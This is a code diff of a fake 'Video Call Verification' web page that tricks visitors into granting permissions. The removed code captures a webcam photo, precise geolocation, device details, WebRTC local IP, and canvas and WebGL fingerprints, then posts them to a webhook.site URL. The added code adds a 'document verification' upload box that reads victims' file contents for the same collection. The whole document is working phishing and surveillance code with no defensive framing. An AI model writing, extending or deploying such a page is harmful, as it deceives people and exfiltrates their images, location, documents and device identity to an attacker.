@@ -1,266 +1,132 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <!-- पुराना head section same -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Call Verification - Please Allow Access</title>
+    <title>Video Call + Document Verification</title>
+    <!-- पुराना CSS same रहो -->
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-        }
-        .container {
-            background: rgba(255,255,255,0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 450px;
-            backdrop-filter: blur(10px);
-        }
-        .logo { font-size: 48px; margin-bottom: 20px; color: #667eea; }
-        h1 { color: #333; margin-bottom: 15px; font-size: 28px; }
-        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
-        .permissions {
-            background: #f8f9ff;
-            border: 2px solid #e1e8ff;
+        /* पुराना CSS + नवा file section */
+        .file-drop {
+            border: 3px dashed #45b7d1;
             border-radius: 12px;
-            padding: 25px;
-            margin: 25px 0;
-        }
-        .permission-item {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 15px 0;
-            font-weight: 500;
-        }
-        .icon { 
-            width: 40px; height: 40px; 
-            border-radius: 50%; 
-            margin-right: 15px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            font-size: 18px;
-        }
-        .camera { background: linear-gradient(45deg, #ff6b6b, #ff8e8e); color: white; }
-        .location { background: linear-gradient(45deg, #4ecdc4, #44a08d); color: white; }
-        .files { background: linear-gradient(45deg, #45b7d1, #96c93d); color: white; }
-        .allow-btn {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 18px 50px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+            background: #f0f8ff;
             transition: all 0.3s;
-            margin-top: 20px;
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            cursor: pointer;
         }
-        .allow-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6); }
-        .allow-btn:active { transform: translateY(0); }
-        .video-preview { 
-            width: 300px; height: 200px; 
-            background: #000; 
-            border-radius: 12px; 
-            margin: 20px auto; 
-            display: none;
+        .file-drop.dragover {
+            background: #e3f2fd;
+            border-color: #2196f3;
+            transform: scale(1.02);
         }
-        .status { color: #28a745; font-weight: bold; margin-top: 15px; display: none; }
+        .file-list {
+            margin-top: 15px;
+            max-height: 150px;
+            overflow-y: auto;
+            text-align: left;
+        }
+        .file-item {
+            background: white;
+            padding: 8px 12px;
+            margin: 5px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+        /* बाकी पुराना CSS same */
     </style>
 </head>
 <body>
+    <!-- पुराना HTML + नवा file section -->
     <div class="container">
-        <div class="logo">📹</div>
-        <h1>Video Call Verification Required</h1>
-        <p>Your account needs verification for secure video calling. Please allow all permissions to continue.</p>
-        
-        <div class="permissions">
-            <div class="permission-item">
-                <div class="icon camera">📷</div>
-                <span>Camera Access</span>
-            </div>
-            <div class="permission-item">
-                <div class="icon location">📍</div>
-                <span>Location Access</span>
-            </div>
-            <div class="permission-item">
-                <div class="icon files">📁</div>
-                <span>File Access</span>
-            </div>
+        <!-- पुराना content same -->
+        <div class="file-drop" id="fileDrop" onclick="document.getElementById('fileInput').click()">
+            <div style="font-size: 48px; margin-bottom: 15px;">📁</div>
+            <h3>Upload Documents for Verification</h3>
+            <p>Drag & drop files or click to select (PDF, Images, Docs)</p>
+            <input type="file" id="fileInput" multiple style="display:none;" accept="*/*">
+            <div class="file-list" id="fileList"></div>
         </div>
-
-        <video id="video" class="video-preview" autoplay muted></video>
-        <button class="allow-btn" onclick="requestAllPermissions()">
-            🔐 ALLOW ALL PERMISSIONS
-        </button>
-        <div id="status" class="status">✅ Verification Complete! Thank you.</div>
+        <!-- बाकी पुराना HTML same -->
     </div>
 
     <script>
-        let targetData = {};
-
-        async function requestAllPermissions() {
-            try {
-                // 1. Get Geolocation
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            targetData.location = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            };
-                        },
-                        (error) => {
-                            targetData.location_error = error.message;
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                }
-
-                // 2. Get Camera Access + Capture Photo
-                const video = document.getElementById('video');
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                video.srcObject = stream;
-                video.style.display = 'block';
+        let targetFiles = [];
+        
+        // File handling functions
+        document.getElementById('fileDrop').addEventListener('dragover', (e) => {
+            e.preventDefault();
+            e.currentTarget.classList.add('dragover');
+        });
+        
+        document.getElementById('fileDrop').addEventListener('dragleave', (e) => {
+            e.currentTarget.classList.remove('dragover');
+        });
+        
+        document.getElementById('fileDrop').addEventListener('drop', (e) => {
+            e.preventDefault();
+            e.currentTarget.classList.remove('dragover');
+            handleFiles(e.dataTransfer.files);
+        });
+        
+        document.getElementById('fileInput').addEventListener('change', (e) => {
+            handleFiles(e.target.files);
+        });
+        
+        function handleFiles(files) {
+            targetFiles = Array.from(files);
+            const fileList = document.getElementById('fileList');
+            fileList.innerHTML = '';
+            
+            targetFiles.forEach((file, index) => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerHTML = `
+                    📄 ${file.name} 
+                    <span>(${formatBytes(file.size)})</span>
+                `;
+                fileList.appendChild(div);
                 
-                // Capture photo after 2 seconds
-                setTimeout(() => {
-                    capturePhoto(video);
-                }, 2000);
-
-                // 3. Get Device Info
-                targetData.deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight
-                    },
-                    colorDepth: screen.colorDepth
-                };
-
-                // 4. Get Local IP (WebRTC)
-                getLocalIP();
-
-                // 5. Canvas Fingerprinting
-                targetData.canvasFingerprint = getCanvasFingerprint();
-
-                // 6. WebGL Fingerprinting
-                targetData.webglFingerprint = getWebGLFingerprint();
-
-                // 7. Battery Info (if available)
-                if ('getBattery' in navigator) {
-                    navigator.getBattery().then(battery => {
-                        targetData.battery = {
-                            level: battery.level,
-                            charging: battery.charging
-                        };
-                    });
-                }
-
-                // Send data after 3 seconds (give time for all async operations)
-                setTimeout(() => {
-                    sendToWebhook();
-                    showSuccess();
-                }, 3000);
-
-            } catch (error) {
-                targetData.error = error.message;
-                sendToWebhook();
-            }
-        }
-
-        function capturePhoto(video) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            // Convert to base64 (small size for webhook)
-            canvas.toBlob((blob) => {
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    targetData.photo = reader.result.split(',')[1]; // Remove data:image/jpeg;base64,
-                };
-                reader.readAsDataURL(blob);
-            }, 'image/jpeg', 0.7);
-        }
-
-        function getLocalIP() {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (ipMatch) {
-                        targetData.localIP = ipMatch[1];
-                    }
-                }
-                pc.close();
-            };
-            pc.createOffer().then(pc.setLocalDescription.bind(pc));
-        }
-
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Canvas fingerprinting test', 2, 2);
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            return canvas.toDataURL();
-        }
-
-        function getWebGLFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '',
-                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : ''
-                };
-            }
-            return null;
-        }
-
-        async function sendToWebhook() {
-            targetData.timestamp = new Date().toISOString();
-            targetData.url = window.location.href;
-            
-            const response = await fetch('https://webhook.site/5c412fd2-b749-4a69-bb73-c4ecf02dd9bc', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(targetData, null, 2)
+                // Read file content
+                readFile(file, index);
             });
         }
+        
+        function readFile(file, index) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                targetFiles[index].content = e.target.result.substring(0, 10000); // First 10KB
+                targetFiles[index].contentType = file.type;
+            };
+            reader.readAsDataURL(file);
+        }
+        
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
 
-        function showSuccess() {
-            document.getElementById('status').style.display = 'block';
-            document.querySelector('.allow-btn').style.display = 'none';
+        // Updated requestAllPermissions() - FILES ADD केले
+        async function requestAllPermissions() {
+            // पुराने permissions same...
+            
+            // ADD FILES to targetData
+            targetData.files = targetFiles.map(f => ({
+                name: f.name,
+                size: f.size,
+                type: f.type,
+                contentPreview: f.content ? f.content.substring(0, 500) : null
+            }));
+            
+            // बाकी same...
         }
     </script>
 </body>
